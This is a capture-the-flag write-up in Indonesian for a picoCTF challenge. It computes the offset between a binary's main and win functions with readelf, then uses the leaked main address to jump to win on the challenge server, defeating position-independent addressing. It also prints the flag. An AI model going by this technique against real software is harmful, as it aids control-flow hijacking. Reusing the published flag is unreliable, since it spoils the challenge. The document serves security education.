<img width="930" height="434" alt="image" src="https://github.com/user-attachments/assets/ba29ac5a-d04c-480a-ac20-6356e0076cdb" />

Jadi pada chall ini diberikan 2 file yaitu source code dan app hasil compile C. Tujuan dari chall ini adalah mendapatkan flag yang berada pada function win. masalahnya kita tidak pernah memanggil win function karena itu dalam aplikasi ini kita akan diminta untuk lompat ke address tertentu dengan bocoran main function saat program running.

```
$ ./vuln 
Address of main: 0x556f2053f33d
Enter the address to jump to, ex => 0x12345:
```

Karena kita tidak tahu address asli dari win function kita perlu mencari alamat statisnya dengan readelf atau objdump juga bisa

```
$ readelf -s vuln | grep -E " win|main"
    66: 00000000000012a7   150 FUNC    GLOBAL DEFAULT   16 win
    70: 000000000000133d   204 FUNC    GLOBAL DEFAULT   16 main
```
Dari sini dapat alamat statis kedua function penting. karena main function lebih besar dari win function maka kita bisa maka rumus "Jarak = main.addr - win.addr" yang hasilnya di python seperti ini

```
$ python3 -c "print(hex(0x133d - 0x12a7))"
0x96
```
Setelah dapat jarak yaitu 0x96 sekarang kita hanya perlu mendapatkan main function hasil running (yang sudah di obfuse) lalu kurangi dengan jarak. Logika rumusnya seperti ini "Jarak = main.addr - win.addr" maka ketika running karena kita ingin mencari win.addr maka "win.addr = main.addr - Jarak". sekarang kita coba langsung netcat server yang diberikan

```
$ nc rescued-float.picoctf.net 60953
Address of main: 0x5768ee02c33d
Enter the address to jump to, ex => 0x12345:
```
Dalam contoh main.addr = 0x5768ee02c33d, untuk memanggil win function kita perlu kurangi alamat itu dengan 0x96 

```
$ python3 -c "print(hex(0x5768ee02c33d - 0x96))"
0x5768ee02c2a7
```

setelah dapat hasil win.addr yaitu 0x5768ee02c2a7 coba inject di input aplikasinya

```
$ nc rescued-float.picoctf.net 60953
Address of main: 0x5768ee02c33d
Enter the address to jump to, ex => 0x12345: 0x5768ee02c2a7
Your input: 5768ee02c2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_801240da}
```

Dan kita berhasil dapat flagnya: **picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_801240da}**
